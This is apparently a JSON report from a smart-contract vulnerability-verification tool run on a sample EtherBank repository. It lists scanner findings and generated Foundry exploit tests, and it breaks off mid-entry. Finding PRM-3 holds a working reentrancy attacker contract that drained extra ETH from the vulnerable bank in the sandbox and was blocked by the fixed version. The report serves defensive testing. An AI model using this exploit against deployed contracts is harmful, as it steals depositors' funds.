@@ -1,0 +1,1051 @@
+{
+  "repo": "local:examples/reentrancy-bank",
+  "commit": "f7bd817e34f043e6c068884d1ae9cc50bed5f38c98ca59b2c2606d55ecc5578a",
+  "startedAt": "2026-11-06T15:27:55.430Z",
+  "finishedAt": "2026-11-06T15:28:08.051Z",
+  "tools": [
+    {
+      "name": "forge",
+      "version": "forge Version: 1.8.7"
+    },
+    {
+      "name": "slither",
+      "version": "0.11.6"
+    },
+    {
+      "name": "aderyn",
+      "version": "aderyn 0.6.8"
+    },
+    {
+      "name": "solc",
+      "version": "0.8.20,0.8.24,0.8.26,0.8.28,0.8.30,0.8.33,0.8.35,0.8.38"
+    },
+    {
+      "name": "pramaan-sandbox",
+      "version": "1"
+    }
+  ],
+  "build": {
+    "ok": true,
+    "log": "Compiling 22 files with Solc 0.8.30\nSolc 0.8.30 finished in 2.10s\nCompiler run successful!\nwarning[reentrancy-eth]: uncapped ETH transfer can be reentered before `balances` is updated\n   ╭▸ src/EtherBank.sol:22:22\n   │\n22 │         (bool ok,) = msg.sender.call{value: amount}(\"\");\n   │                      ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n   │\n   ╰ help: https://getfoundry.sh/forge/linting/reentrancy-eth\n\nwarning[reentrancy-events]: event emitted after an external call; reentrancy can reorder or fabricate logs that off-chain consumers rely on\n   ╭▸ src/EtherBankFixed.sol:23:9\n   │\n23 │         emit Withdrawn(msg.sender, amount);\n   │         ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n   │\n   ╰ help: https://getfoundry.sh/forge/linting/reentrancy-events\n\nwarning[reentrancy-events]: event emitted after an external call; reentrancy can reorder or fabricate logs that off-chain consumers rely on\n   ╭▸ src/EtherBank.sol:25:9\n   │\n25 │         emit Withdrawn(msg.sender, amount);\n   │         ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n   │\n   ╰ help: https://getfoundry.sh/forge/linting/reentrancy-events\n\n"
+  },
+  "scanners": {
+    "slither": {
+      "ok": true,
+      "error": null,
+      "results": 3
+    },
+    "aderyn": {
+      "ok": true,
+      "error": null,
+      "results": 4
+    }
+  },
+  "contracts": [
+    {
+      "name": "EtherBankFixed",
+      "source": "src/EtherBankFixed.sol",
+      "kind": "contract",
+      "abstract": false,
+      "bases": [],
+      "deployable": true,
+      "abi": [
+        {
+          "type": "function",
+          "name": "balances",
+          "inputs": [
+            {
+              "name": "account",
+              "type": "address",
+              "internalType": "address"
+            }
+          ],
+          "outputs": [
+            {
+              "name": "",
+              "type": "uint256",
+              "internalType": "uint256"
+            }
+          ],
+          "stateMutability": "view"
+        },
+        {
+          "type": "function",
+          "name": "deposit",
+          "inputs": [],
+          "outputs": [],
+          "stateMutability": "payable"
+        },
+        {
+          "type": "function",
+          "name": "withdraw",
+          "inputs": [],
+          "outputs": [],
+          "stateMutability": "nonpayable"
+        },
+        {
+          "type": "event",
+          "name": "Deposited",
+          "inputs": [
+            {
+              "name": "account",
+              "type": "address",
+              "indexed": true,
+              "internalType": "address"
+            },
+            {
+              "name": "amount",
+              "type": "uint256",
+              "indexed": false,
+              "internalType": "uint256"
+            }
+          ],
+          "anonymous": false
+        },
+        {
+          "type": "event",
+          "name": "Withdrawn",
+          "inputs": [
+            {
+              "name": "account",
+              "type": "address",
+              "indexed": true,
+              "internalType": "address"
+            },
+            {
+              "name": "amount",
+              "type": "uint256",
+              "indexed": false,
+              "internalType": "uint256"
+            }
+          ],
+          "anonymous": false
+        }
+      ],
+      "functions": [
+        {
+          "name": "deposit",
+          "kind": "function",
+          "visibility": "external",
+          "stateMutability": "payable",
+          "modifiers": [],
+          "parameters": [],
+          "src": {
+            "start": 389,
+            "length": 181,
+            "bodyStart": 425
+          },
+          "lines": [
+            11,
+            15
+          ]
+        },
+        {
+          "name": "withdraw",
+          "kind": "function",
+          "visibility": "external",
+          "stateMutability": "nonpayable",
+          "modifiers": [],
+          "parameters": [],
+          "src": {
+            "start": 576,
+            "length": 310,
+            "bodyStart": 605
+          },
+          "lines": [
+            17,
+            24
+          ]
+        }
+      ]
+    },
+    {
+      "name": "EtherBank",
+      "source": "src/EtherBank.sol",
+      "kind": "contract",
+      "abstract": false,
+      "bases": [],
+      "deployable": true,
+      "abi": [
+        {
+          "type": "function",
+          "name": "balances",
+          "inputs": [
+            {
+              "name": "account",
+              "type": "address",
+              "internalType": "address"
+            }
+          ],
+          "outputs": [
+            {
+              "name": "",
+              "type": "uint256",
+              "internalType": "uint256"
+            }
+          ],
+          "stateMutability": "view"
+        },
+        {
+          "type": "function",
+          "name": "deposit",
+          "inputs": [],
+          "outputs": [],
+          "stateMutability": "payable"
+        },
+        {
+          "type": "function",
+          "name": "withdraw",
+          "inputs": [],
+          "outputs": [],
+          "stateMutability": "nonpayable"
+        },
+        {
+          "type": "event",
+          "name": "Deposited",
+          "inputs": [
+            {
+              "name": "account",
+              "type": "address",
+              "indexed": true,
+              "internalType": "address"
+            },
+            {
+              "name": "amount",
+              "type": "uint256",
+              "indexed": false,
+              "internalType": "uint256"
+            }
+          ],
+          "anonymous": false
+        },
+        {
+          "type": "event",
+          "name": "Withdrawn",
+          "inputs": [
+            {
+              "name": "account",
+              "type": "address",
+              "indexed": true,
+              "internalType": "address"
+            },
+            {
+              "name": "amount",
+              "type": "uint256",
+              "indexed": false,
+              "internalType": "uint256"
+            }
+          ],
+          "anonymous": false
+        }
+      ],
+      "functions": [
+        {
+          "name": "deposit",
+          "kind": "function",
+          "visibility": "external",
+          "stateMutability": "payable",
+          "modifiers": [],
+          "parameters": [],
+          "src": {
+            "start": 557,
+            "length": 181,
+            "bodyStart": 593
+          },
+          "lines": [
+            13,
+            17
+          ]
+        },
+        {
+          "name": "withdraw",
+          "kind": "function",
+          "visibility": "external",
+          "stateMutability": "nonpayable",
+          "modifiers": [],
+          "parameters": [],
+          "src": {
+            "start": 744,
+            "length": 310,
+            "bodyStart": 773
+          },
+          "lines": [
+            19,
+            26
+          ]
+        }
+      ]
+    }
+  ],
+  "candidates": [
+    {
+      "key": "access-control:EtherBank:withdraw()",
+      "vulnClass": "access-control",
+      "title": "Missing access control on a value-moving function",
+      "severity": "high",
+      "confidence": "medium",
+      "contract": "EtherBank",
+      "function": "withdraw()",
+      "file": "src/EtherBank.sol",
+      "lines": [
+        19
+      ],
+      "sources": [
+        {
+          "tool": "aderyn",
+          "detector": "eth-send-unchecked-address",
+          "description": "ETH transferred without address checks"
+        }
+      ]
+    },
+    {
+      "key": "access-control:EtherBankFixed:withdraw()",
+      "vulnClass": "access-control",
+      "title": "Missing access control on a value-moving function",
+      "severity": "high",
+      "confidence": "medium",
+      "contract": "EtherBankFixed",
+      "function": "withdraw()",
+      "file": "src/EtherBankFixed.sol",
+      "lines": [
+        17
+      ],
+      "sources": [
+        {
+          "tool": "aderyn",
+          "detector": "eth-send-unchecked-address",
+          "description": "ETH transferred without address checks"
+        }
+      ]
+    },
+    {
+      "key": "reentrancy:EtherBank:withdraw()",
+      "vulnClass": "reentrancy",
+      "title": "Reentrancy: state updated after an external call",
+      "severity": "high",
+      "confidence": "high",
+      "contract": "EtherBank",
+      "function": "withdraw()",
+      "file": "src/EtherBank.sol",
+      "lines": [
+        19,
+        20,
+        21,
+        22,
+        23,
+        24,
+        25,
+        26
+      ],
+      "sources": [
+        {
+          "tool": "slither",
+          "detector": "reentrancy-eth",
+          "description": "Reentrancy in EtherBank.withdraw() (src/EtherBank.sol#19-26):\n\tExternal calls:\n\t- (ok,None) = msg.sender.call{value: amount}() (src/EtherBank.sol#22)\n\tState variables written after the call(s):\n\t- balances[msg.sender] = 0 (src/EtherBank.sol#24)\n\tEtherBank.balances (src/EtherBank.sol#8) can be used in cross function reentrancies:\n\t- EtherBank.balances (src/EtherBank.sol#8)\n\t- EtherBank.deposit() (src/EtherBank.sol#13-17)\n\t- EtherBank.withdraw() (src/EtherBank.sol#19-26)"
+        },
+        {
+          "tool": "aderyn",
+          "detector": "reentrancy-state-change",
+          "description": "Reentrancy: State change after external call"
+        }
+      ]
+    },
+    {
+      "key": "push-zero-opcode:src/EtherBank.sol:L2",
+      "vulnClass": "push-zero-opcode",
+      "title": "PUSH0 Opcode",
+      "severity": "low",
+      "confidence": "medium",
+      "contract": "src/EtherBank.sol",
+      "function": null,
+      "file": "src/EtherBank.sol",
+      "lines": [
+        2
+      ],
+      "sources": [
+        {
+          "tool": "aderyn",
+          "detector": "push-zero-opcode",
+          "description": "PUSH0 Opcode"
+        }
+      ]
+    },
+    {
+      "key": "push-zero-opcode:src/EtherBankFixed.sol:L2",
+      "vulnClass": "push-zero-opcode",
+      "title": "PUSH0 Opcode",
+      "severity": "low",
+      "confidence": "medium",
+      "contract": "src/EtherBankFixed.sol",
+      "function": null,
+      "file": "src/EtherBankFixed.sol",
+      "lines": [
+        2
+      ],
+      "sources": [
+        {
+          "tool": "aderyn",
+          "detector": "push-zero-opcode",
+          "description": "PUSH0 Opcode"
+        }
+      ]
+    },
+    {
+      "key": "reentrancy-events:EtherBank:withdraw()",
+      "vulnClass": "reentrancy-events",
+      "title": "reentrancy-events",
+      "severity": "low",
+      "confidence": "medium",
+      "contract": "EtherBank",
+      "function": "withdraw()",
+      "file": "src/EtherBank.sol",
+      "lines": [
+        19,
+        20,
+        21,
+        22,
+        23,
+        24,
+        25,
+        26
+      ],
+      "sources": [
+        {
+          "tool": "slither",
+          "detector": "reentrancy-events",
+          "description": "Reentrancy in EtherBank.withdraw() (src/EtherBank.sol#19-26):\n\tExternal calls:\n\t- (ok,None) = msg.sender.call{value: amount}() (src/EtherBank.sol#22)\n\tEvent emitted after the call(s):\n\t- Withdrawn(msg.sender,amount) (src/EtherBank.sol#25)"
+        }
+      ]
+    },
+    {
+      "key": "reentrancy-events:EtherBankFixed:withdraw()",
+      "vulnClass": "reentrancy-events",
+      "title": "reentrancy-events",
+      "severity": "low",
+      "confidence": "medium",
+      "contract": "EtherBankFixed",
+      "function": "withdraw()",
+      "file": "src/EtherBankFixed.sol",
+      "lines": [
+        17,
+        18,
+        19,
+        20,
+        21,
+        22,
+        23,
+        24
+      ],
+      "sources": [
+        {
+          "tool": "slither",
+          "detector": "reentrancy-events",
+          "description": "Reentrancy in EtherBankFixed.withdraw() (src/EtherBankFixed.sol#17-24):\n\tExternal calls:\n\t- (ok,None) = msg.sender.call{value: amount}() (src/EtherBankFixed.sol#21)\n\tEvent emitted after the call(s):\n\t- Withdrawn(msg.sender,amount) (src/EtherBankFixed.sol#23)"
+        }
+      ]
+    },
+    {
+      "key": "unspecific-solidity-pragma:src/EtherBank.sol:L2",
+      "vulnClass": "unspecific-solidity-pragma",
+      "title": "Unspecific Solidity Pragma",
+      "severity": "low",
+      "confidence": "medium",
+      "contract": "src/EtherBank.sol",
+      "function": null,
+      "file": "src/EtherBank.sol",
+      "lines": [
+        2
+      ],
+      "sources": [
+        {
+          "tool": "aderyn",
+          "detector": "unspecific-solidity-pragma",
+          "description": "Unspecific Solidity Pragma"
+        }
+      ]
+    },
+    {
+      "key": "unspecific-solidity-pragma:src/EtherBankFixed.sol:L2",
+      "vulnClass": "unspecific-solidity-pragma",
+      "title": "Unspecific Solidity Pragma",
+      "severity": "low",
+      "confidence": "medium",
+      "contract": "src/EtherBankFixed.sol",
+      "function": null,
+      "file": "src/EtherBankFixed.sol",
+      "lines": [
+        2
+      ],
+      "sources": [
+        {
+          "tool": "aderyn",
+          "detector": "unspecific-solidity-pragma",
+          "description": "Unspecific Solidity Pragma"
+        }
+      ]
+    }
+  ],
+  "findings": [
+    {
+      "id": "PRM-1",
+      "candidate": {
+        "key": "access-control:EtherBank:withdraw()",
+        "vulnClass": "access-control",
+        "title": "Missing access control on a value-moving function",
+        "severity": "high",
+        "confidence": "medium",
+        "contract": "EtherBank",
+        "function": "withdraw()",
+        "file": "src/EtherBank.sol",
+        "lines": [
+          19
+        ],
+        "sources": [
+          {
+            "tool": "aderyn",
+            "detector": "eth-send-unchecked-address",
+            "description": "ETH transferred without address checks"
+          }
+        ]
+      },
+      "templateId": "access-control-drain",
+      "plan": {
+        "templateId": "access-control-drain",
+        "version": "1",
+        "filledBy": "heuristics",
+        "target": {
+          "name": "EtherBank",
+          "source": "src/EtherBank.sol"
+        },
+        "deploy": {
+          "kind": "direct",
+          "ctorArgs": [],
+          "initializer": null
+        },
+        "fund": {
+          "fn": "deposit",
+          "valueExpr": "SEED"
+        },
+        "attack": {
+          "fn": "withdraw",
+          "args": []
+        },
+        "drain": null,
+        "hasOwnerGetter": false,
+        "hypothesis": "EtherBank.withdraw() moves the contract's ETH without checking who calls it.",
+        "property": "An account with no role must not be able to take ETH that other users deposited.",
+        "preconditions": [
+          "a victim has deposited SEED (10 ether) via deposit",
+          "the attacker holds no role in the contract"
+        ]
+      },
+      "planError": null,
+      "test": {
+        "fileName": "PramaanExploit_PRM_1.t.sol",
+        "contractName": "PramaanExploit_PRM_1",
+        "source": "// SPDX-License-Identifier: UNLICENSED\n// Generated by Pramaan for finding PRM-1: template access-control-drain@1, slots filled by heuristics.\n// Hypothesis: EtherBank.withdraw() moves the contract's ETH without checking who calls it.\n// Property under test: An account with no role must not be able to take ETH that other users deposited.\n// Passing on the vulnerable code reproduces the bug. On fixed code this test must fail (revert or property assertion).\npragma solidity >=0.8.0 <0.9.0;\n\nimport {Test} from \"lib/pramaan-forge-std/src/Test.sol\";\nimport {EtherBank as PramaanTarget} from \"src/EtherBank.sol\";\n\ncontract PramaanExploit_PRM_1 is Test {\n    PramaanTarget internal target;\n    address internal owner = makeAddr(\"pramaan.owner\");\n    address internal victim = makeAddr(\"pramaan.victim\");\n    address internal attacker = makeAddr(\"pramaan.attacker\");\n    uint256 internal constant SEED = 10 ether;\n    uint256 internal constant ATTACK = 1 ether;\n\n    function setUp() public {\n        vm.startPrank(owner);\n        target = new PramaanTarget();\n        vm.stopPrank();\n        vm.deal(victim, SEED);\n        vm.prank(victim);\n        target.deposit{value: SEED}();\n    }\n\n    function test_exploit() public {\n        uint256 targetBefore = address(target).balance;\n        uint256 attackerBefore = attacker.balance;\n        vm.prank(attacker);\n        target.withdraw();\n        uint256 gained = attacker.balance - attackerBefore;\n        emit log_named_uint(\"pramaan.target_balance_before\", targetBefore);\n        emit log_named_uint(\"pramaan.attacker_gain\", gained);\n        assertGe(gained, SEED, \"Pramaan: an account with no role took ETH other users deposited\");\n    }\n}\n",
+        "sha256": "a205e0771b063215ec73c1753a81c17db791ca7650f6307e268ad42a018e9994"
+      },
+      "gates": [
+        {
+          "id": "slot-vocabulary",
+          "passed": true,
+          "detail": "1 slot values from the allowed vocabulary"
+        },
+        {
+          "id": "no-state-forging",
+          "passed": true,
+          "detail": "attack phase uses no vm.store / etch / mockCall / deal(target) / ffi"
+        },
+        {
+          "id": "attacker-only",
+          "passed": true,
+          "detail": "pranks: attacker"
+        },
+        {
+          "id": "concrete-assertion",
+          "passed": true,
+          "detail": "asserts an attacker balance or owner change"
+        }
+      ],
+      "vulnerableRun": {
+        "result": "failed",
+        "reason": "nothing to withdraw",
+        "logs": [],
+        "durationMs": null
+      },
+      "status": "not-reproduced",
+      "pairs": [
+        {
+          "fixedContract": "EtherBankFixed",
+          "test": {
+            "fileName": "PramaanExploit_PRM_1_EtherBankFixed.t.sol",
+            "contractName": "PramaanExploit_PRM_1_EtherBankFixed",
+            "source": "// SPDX-License-Identifier: UNLICENSED\n// Generated by Pramaan for finding PRM-1: template access-control-drain@1, slots filled by heuristics.\n// Hypothesis: EtherBank.withdraw() moves the contract's ETH without checking who calls it.\n// Property under test: An account with no role must not be able to take ETH that other users deposited.\n// Passing on the vulnerable code reproduces the bug. On fixed code this test must fail (revert or property assertion).\npragma solidity >=0.8.0 <0.9.0;\n\nimport {Test} from \"lib/pramaan-forge-std/src/Test.sol\";\nimport {EtherBankFixed as PramaanTarget} from \"src/EtherBankFixed.sol\";\n\ncontract PramaanExploit_PRM_1_EtherBankFixed is Test {\n    PramaanTarget internal target;\n    address internal owner = makeAddr(\"pramaan.owner\");\n    address internal victim = makeAddr(\"pramaan.victim\");\n    address internal attacker = makeAddr(\"pramaan.attacker\");\n    uint256 internal constant SEED = 10 ether;\n    uint256 internal constant ATTACK = 1 ether;\n\n    function setUp() public {\n        vm.startPrank(owner);\n        target = new PramaanTarget();\n        vm.stopPrank();\n        vm.deal(victim, SEED);\n        vm.prank(victim);\n        target.deposit{value: SEED}();\n    }\n\n    function test_exploit() public {\n        uint256 targetBefore = address(target).balance;\n        uint256 attackerBefore = attacker.balance;\n        vm.prank(attacker);\n        target.withdraw();\n        uint256 gained = attacker.balance - attackerBefore;\n        emit log_named_uint(\"pramaan.target_balance_before\", targetBefore);\n        emit log_named_uint(\"pramaan.attacker_gain\", gained);\n        assertGe(gained, SEED, \"Pramaan: an account with no role took ETH other users deposited\");\n    }\n}\n",
+            "sha256": "9482a2e2f7319a561a8b2d3e9595507a1c6a2b3a15c6300163840f9d5662a022"
+          },
+          "outcome": {
+            "kind": "reverted",
+            "reason": "nothing to withdraw"
+          },
+          "verified": false
+        }
+      ]
+    },
+    {
+      "id": "PRM-2",
+      "candidate": {
+        "key": "access-control:EtherBankFixed:withdraw()",
+        "vulnClass": "access-control",
+        "title": "Missing access control on a value-moving function",
+        "severity": "high",
+        "confidence": "medium",
+        "contract": "EtherBankFixed",
+        "function": "withdraw()",
+        "file": "src/EtherBankFixed.sol",
+        "lines": [
+          17
+        ],
+        "sources": [
+          {
+            "tool": "aderyn",
+            "detector": "eth-send-unchecked-address",
+            "description": "ETH transferred without address checks"
+          }
+        ]
+      },
+      "templateId": "access-control-drain",
+      "plan": {
+        "templateId": "access-control-drain",
+        "version": "1",
+        "filledBy": "heuristics",
+        "target": {
+          "name": "EtherBankFixed",
+          "source": "src/EtherBankFixed.sol"
+        },
+        "deploy": {
+          "kind": "direct",
+          "ctorArgs": [],
+          "initializer": null
+        },
+        "fund": {
+          "fn": "deposit",
+          "valueExpr": "SEED"
+        },
+        "attack": {
+          "fn": "withdraw",
+          "args": []
+        },
+        "drain": null,
+        "hasOwnerGetter": false,
+        "hypothesis": "EtherBankFixed.withdraw() moves the contract's ETH without checking who calls it.",
+        "property": "An account with no role must not be able to take ETH that other users deposited.",
+        "preconditions": [
+          "a victim has deposited SEED (10 ether) via deposit",
+          "the attacker holds no role in the contract"
+        ]
+      },
+      "planError": null,
+      "test": {
+        "fileName": "PramaanExploit_PRM_2.t.sol",
+        "contractName": "PramaanExploit_PRM_2",
+        "source": "// SPDX-License-Identifier: UNLICENSED\n// Generated by Pramaan for finding PRM-2: template access-control-drain@1, slots filled by heuristics.\n// Hypothesis: EtherBankFixed.withdraw() moves the contract's ETH without checking who calls it.\n// Property under test: An account with no role must not be able to take ETH that other users deposited.\n// Passing on the vulnerable code reproduces the bug. On fixed code this test must fail (revert or property assertion).\npragma solidity >=0.8.0 <0.9.0;\n\nimport {Test} from \"lib/pramaan-forge-std/src/Test.sol\";\nimport {EtherBankFixed as PramaanTarget} from \"src/EtherBankFixed.sol\";\n\ncontract PramaanExploit_PRM_2 is Test {\n    PramaanTarget internal target;\n    address internal owner = makeAddr(\"pramaan.owner\");\n    address internal victim = makeAddr(\"pramaan.victim\");\n    address internal attacker = makeAddr(\"pramaan.attacker\");\n    uint256 internal constant SEED = 10 ether;\n    uint256 internal constant ATTACK = 1 ether;\n\n    function setUp() public {\n        vm.startPrank(owner);\n        target = new PramaanTarget();\n        vm.stopPrank();\n        vm.deal(victim, SEED);\n        vm.prank(victim);\n        target.deposit{value: SEED}();\n    }\n\n    function test_exploit() public {\n        uint256 targetBefore = address(target).balance;\n        uint256 attackerBefore = attacker.balance;\n        vm.prank(attacker);\n        target.withdraw();\n        uint256 gained = attacker.balance - attackerBefore;\n        emit log_named_uint(\"pramaan.target_balance_before\", targetBefore);\n        emit log_named_uint(\"pramaan.attacker_gain\", gained);\n        assertGe(gained, SEED, \"Pramaan: an account with no role took ETH other users deposited\");\n    }\n}\n",
+        "sha256": "6aa86bdf8ea8a005829c1cdf186fe2802a7a387aabf11b118a53722e63e41d8e"
+      },
+      "gates": [
+        {
+          "id": "slot-vocabulary",
+          "passed": true,
+          "detail": "1 slot values from the allowed vocabulary"
+        },
+        {
+          "id": "no-state-forging",
+          "passed": true,
+          "detail": "attack phase uses no vm.store / etch / mockCall / deal(target) / ffi"
+        },
+        {
+          "id": "attacker-only",
+          "passed": true,
+          "detail": "pranks: attacker"
+        },
+        {
+          "id": "concrete-assertion",
+          "passed": true,
+          "detail": "asserts an attacker balance or owner change"
+        }
+      ],
+      "vulnerableRun": {
+        "result": "failed",
+        "reason": "nothing to withdraw",
+        "logs": [],
+        "durationMs": null
+      },
+      "status": "not-reproduced",
+      "pairs": []
+    },
+    {
+      "id": "PRM-3",
+      "candidate": {
+        "key": "reentrancy:EtherBank:withdraw()",
+        "vulnClass": "reentrancy",
+        "title": "Reentrancy: state updated after an external call",
+        "severity": "high",
+        "confidence": "high",
+        "contract": "EtherBank",
+        "function": "withdraw()",
+        "file": "src/EtherBank.sol",
+        "lines": [
+          19,
+          20,
+          21,
+          22,
+          23,
+          24,
+          25,
+          26
+        ],
+        "sources": [
+          {
+            "tool": "slither",
+            "detector": "reentrancy-eth",
+            "description": "Reentrancy in EtherBank.withdraw() (src/EtherBank.sol#19-26):\n\tExternal calls:\n\t- (ok,None) = msg.sender.call{value: amount}() (src/EtherBank.sol#22)\n\tState variables written after the call(s):\n\t- balances[msg.sender] = 0 (src/EtherBank.sol#24)\n\tEtherBank.balances (src/EtherBank.sol#8) can be used in cross function reentrancies:\n\t- EtherBank.balances (src/EtherBank.sol#8)\n\t- EtherBank.deposit() (src/EtherBank.sol#13-17)\n\t- EtherBank.withdraw() (src/EtherBank.sol#19-26)"
+          },
+          {
+            "tool": "aderyn",
+            "detector": "reentrancy-state-change",
+            "description": "Reentrancy: State change after external call"
+          }
+        ]
+      },
+      "templateId": "reentrancy-eth",
+      "plan": {
+        "templateId": "reentrancy-eth",
+        "version": "1",
+        "filledBy": "heuristics",
+        "target": {
+          "name": "EtherBank",
+          "source": "src/EtherBank.sol"
+        },
+        "deploy": {
+          "kind": "direct",
+          "ctorArgs": [],
+          "initializer": null
+        },
+        "fund": {
+          "fn": "deposit",
+          "valueExpr": "SEED"
+        },
+        "attack": {
+          "fn": "withdraw",
+          "args": []
+        },
+        "drain": null,
+        "hasOwnerGetter": false,
+        "hypothesis": "EtherBank.withdraw() sends ETH before updating the caller's balance, so a contract can re-enter it.",
+        "property": "No account may withdraw more ETH than it deposited.",
+        "preconditions": [
+          "a victim has deposited SEED (10 ether) via deposit",
+          "the attacker deposits only ATTACK (1 ether)"
+        ]
+      },
+      "planError": null,
+      "test": {
+        "fileName": "PramaanExploit_PRM_3.t.sol",
+        "contractName": "PramaanExploit_PRM_3",
+        "source": "// SPDX-License-Identifier: UNLICENSED\n// Generated by Pramaan for finding PRM-3: template reentrancy-eth@1, slots filled by heuristics.\n// Hypothesis: EtherBank.withdraw() sends ETH before updating the caller's balance, so a contract can re-enter it.\n// Property under test: No account may withdraw more ETH than it deposited.\n// Passing on the vulnerable code reproduces the bug. On fixed code this test must fail (revert or property assertion).\npragma solidity >=0.8.0 <0.9.0;\n\nimport {Test} from \"lib/pramaan-forge-std/src/Test.sol\";\nimport {EtherBank as PramaanTarget} from \"src/EtherBank.sol\";\n\n/// Re-enters the target from its receive() hook while the target still holds ETH.\ncontract PramaanReentrancyAttacker {\n    PramaanTarget internal immutable target;\n    uint256 internal immutable step;\n    uint256 public reentries;\n\n    constructor(PramaanTarget target_, uint256 step_) {\n        target = target_;\n        step = step_;\n    }\n\n    function attack() external payable {\n        target.deposit{value: msg.value}();\n        target.withdraw();\n    }\n\n    receive() external payable {\n        if (reentries < 25 && address(target).balance >= step) {\n            reentries += 1;\n            target.withdraw();\n        }\n    }\n}\n\ncontract PramaanExploit_PRM_3 is Test {\n    PramaanTarget internal target;\n    address internal owner = makeAddr(\"pramaan.owner\");\n    address internal victim = makeAddr(\"pramaan.victim\");\n    address internal attacker = makeAddr(\"pramaan.attacker\");\n    uint256 internal constant SEED = 10 ether;\n    uint256 internal constant ATTACK = 1 ether;\n\n    function setUp() public {\n        vm.startPrank(owner);\n        target = new PramaanTarget();\n        vm.stopPrank();\n        vm.deal(victim, SEED);\n        vm.prank(victim);\n        target.deposit{value: SEED}();\n    }\n\n    function test_exploit() public {\n        vm.deal(attacker, ATTACK);\n        vm.prank(attacker);\n        PramaanReentrancyAttacker exploit = new PramaanReentrancyAttacker(target, ATTACK);\n        vm.prank(attacker);\n        exploit.attack{value: ATTACK}();\n        emit log_named_uint(\"pramaan.reentries\", exploit.reentries());\n        emit log_named_uint(\"pramaan.attacker_contract_balance\", address(exploit).balance);\n        assertGt(exploit.reentries(), 0, \"Pramaan: the target was never re-entered\");\n        assertGt(address(exploit).balance, ATTACK, \"Pramaan: the attacker withdrew more ETH than it deposited\");\n    }\n}\n",
+        "sha256": "05378e14c27eb470ec31b0b2aaef8dd577d056d9e85c183c18e2c1ebe8e3f5c0"
+      },
+      "gates": [
+        {
+          "id": "slot-vocabulary",
+          "passed": true,
+          "detail": "1 slot values from the allowed vocabulary"
+        },
+        {
+          "id": "no-state-forging",
+          "passed": true,
+          "detail": "attack phase uses no vm.store / etch / mockCall / deal(target) / ffi"
+        },
+        {
+          "id": "attacker-only",
+          "passed": true,
+          "detail": "pranks: attacker, attacker"
+        },
+        {
+          "id": "concrete-assertion",
+          "passed": true,
+          "detail": "asserts an attacker balance or owner change"
+        }
+      ],
+      "vulnerableRun": {
+        "result": "passed",
+        "reason": null,
+        "logs": [
+          "pramaan.reentries: 10",
+          "pramaan.attacker_contract_balance: 11000000000000000000"
+        ],
+        "durationMs": null
+      },
+      "status": "reproduced",
+      "pairs": [
+        {
+          "fixedContract": "EtherBankFixed",
+          "test": {
+            "fileName": "PramaanExploit_PRM_3_EtherBankFixed.t.sol",
+            "contractName": "PramaanExploit_PRM_3_EtherBankFixed",
+            "source": "// SPDX-License-Identifier: UNLICENSED\n// Generated by Pramaan for finding PRM-3: template reentrancy-eth@1, slots filled by heuristics.\n// Hypothesis: EtherBank.withdraw() sends ETH before updating the caller's balance, so a contract can re-enter it.\n// Property under test: No account may withdraw more ETH than it deposited.\n// Passing on the vulnerable code reproduces the bug. On fixed code this test must fail (revert or property assertion).\npragma solidity >=0.8.0 <0.9.0;\n\nimport {Test} from \"lib/pramaan-forge-std/src/Test.sol\";\nimport {EtherBankFixed as PramaanTarget} from \"src/EtherBankFixed.sol\";\n\n/// Re-enters the target from its receive() hook while the target still holds ETH.\ncontract PramaanReentrancyAttacker {\n    PramaanTarget internal immutable target;\n    uint256 internal immutable step;\n    uint256 public reentries;\n\n    constructor(PramaanTarget target_, uint256 step_) {\n        target = target_;\n        step = step_;\n    }\n\n    function attack() external payable {\n        target.deposit{value: msg.value}();\n        target.withdraw();\n    }\n\n    receive() external payable {\n        if (reentries < 25 && address(target).balance >= step) {\n            reentries += 1;\n            target.withdraw();\n        }\n    }\n}\n\ncontract PramaanExploit_PRM_3_EtherBankFixed is Test {\n    PramaanTarget internal target;\n    address internal owner = makeAddr(\"pramaan.owner\");\n    address internal victim = makeAddr(\"pramaan.victim\");\n    address internal attacker = makeAddr(\"pramaan.attacker\");\n    uint256 internal constant SEED = 10 ether;\n    uint256 internal constant ATTACK = 1 ether;\n\n    function setUp() public {\n        vm.startPrank(owner);\n        target = new PramaanTarget();\n        vm.stopPrank();\n        vm.deal(victim, SEED);\n        vm.prank(victim);\n        target.deposit{value: SEED}();\n    }\n\n    function test_exploit() public {\n        vm.deal(attacker, ATTACK);\n        vm.prank(attacker);\n        PramaanReentrancyAttacker exploit = new PramaanReentrancyAttacker(target, ATTACK);\n        vm.prank(attacker);\n        exploit.attack{value: ATTACK}();\n        emit log_named_uint(\"pramaan.reentries\", exploit.reentries());\n        emit log_named_uint(\"pramaan.attacker_contract_balance\", address(exploit).balance);\n        assertGt(exploit.reentries(), 0, \"Pramaan: the target was never re-entered\");\n        assertGt(address(exploit).balance, ATTACK, \"Pramaan: the attacker withdrew more ETH than it deposited\");\n    }\n}\n",
+            "sha256": "2a392c1c5c719a6fd95f8b1770da2a808d7581a3062428fad89d89ec2887d2e9"
+          },
+          "outcome": {
+            "kind": "reverted",
+            "reason": "transfer failed"
+          },
+          "verified": true
+        }
+      ]
+    },
+    {
+      "id": "PRM-4",
+      "candidate": {
+        "key": "push-zero-opcode:src/EtherBank.sol:L2",
+        "vulnClass": "push-zero-opcode",
+        "title": "PUSH0 Opcode",
+        "severity": "low",
+        "confidence": "medium",
+        "contract": "src/EtherBank.sol",
+        "function": null,
+        "file": "src/EtherBank.sol",
+        "lines": [
+          2
+        ],
+        "sources": [
+          {
+            "tool": "aderyn",
+            "detector": "push-zero-opcode",
+            "description": "PUSH0 Opcode"
+          }
+        ]
+      },
+      "templateId": null,
+      "plan": null,
+      "planError": "contract src/EtherBank.sol not found in build output",
+      "test": null,
+      "gates": [],
+      "vulnerableRun": {
+        "result": "not-run",
+        "reason": null,
+        "logs": [],
+        "durationMs": null
+      },
+      "status": "candidate",
+      "pairs": []
+    },
+    {
+      "id": "PRM-5",
+      "candidate": {
+        "key": "push-zero-opcode:src/EtherBankFixed.sol:L2",
+        "vulnClass": "push-zero-opcode",
+        "title": "PUSH0 Opcode",
+        "severity": "low",
+        "confidence": "medium",
+        "contract": "src/EtherBankFixed.sol",
+        "function": null,
+        "file": "src/EtherBankFixed.sol",
+        "lines": [
+          2
+        ],
+        "sources": [
+          {
+            "tool": "aderyn",
+            "detector": "push-zero-opcode",
+            "description": "PUSH0 Opcode"
+          }
+        ]
+      },
+      "templateId": null,
+      "plan": null,
